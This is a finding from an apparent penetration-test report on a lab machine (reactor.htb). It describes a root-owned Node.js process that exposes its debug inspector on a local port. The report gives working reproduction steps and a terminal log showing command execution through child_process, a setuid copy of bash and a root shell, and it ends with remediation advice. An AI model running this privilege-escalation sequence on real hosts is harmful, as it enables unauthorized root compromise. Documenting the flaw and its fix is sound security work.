## 4.3 Root Node.js Process with Debug Inspector on Localhost TCP

### F-03   node --inspect -- root REPL on 127.0.0.1:9229 - CRITICAL

| Field | Detail |
|-------|--------|
| Description | A root-owned Node.js process ran `worker.js` with the flag `--inspect=127.0.0.1:9229`, exposing the V8 debug inspector on a local TCP port. Any user on the host who can reach that port obtains a JavaScript REPL executing as root. There is no authentication gating the inspector beyond network locality. |
| Prerequisites | Local authenticated access as any user. No special privileges required. |
| Impact | Arbitrary JavaScript execution as root. Full compromise of the host. |
| Affected system | reactor.htb -- `root` process `/usr/bin/node --inspect=127.0.0.1:9229 /opt/uptime-monitor/worker.js` |
| CVSS 3.1 | 7.8 -- AV:L/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H |
| CWE | CWE-269: Improper Privilege Management |

**Steps to reproduce:**

1. `node inspect 127.0.0.1:9229`
2. In the inspector: `exec("process.mainModule.require('child_process').execSync('cp /bin/bash /tmp/r00t && chmod +s /tmp/r00t')")`
3. `.exit`
4. `/tmp/r00t -p`

**Evidence:**

```
engineer@reactor:~$ node inspect 127.0.0.1:9229
connecting to 127.0.0.1:9229 ... ok
debug> exec("process.getuid()")
0
debug> exec("process.mainModule.require('child_process').execSync('cp /bin/bash /tmp/r00t && chmod +s /tmp/r00t')")

engineer@reactor:~$ /tmp/r00t -p
r00t-5.1# id
uid=1001(engineer) gid=1001(engineer) euid=0(root) egid=0(root)
r00t-5.1# cat /root/root.txt
[redacted]
```

**Remediation:** Remove the `--inspect` flag from the Node.js process running as root. If a debug inspector is operationally required, run the process as an unprivileged user, bind the inspector to a Unix domain socket with restrictive permissions rather than a TCP port, and ensure it is disabled in any environment where untrusted users have local access.

**Verification:** Confirm no Node.js process runs with `--inspect` or `--inspect-brk` as root. Verify port 9229 is no longer listening. Confirm a local user cannot obtain a root REPL on the host.

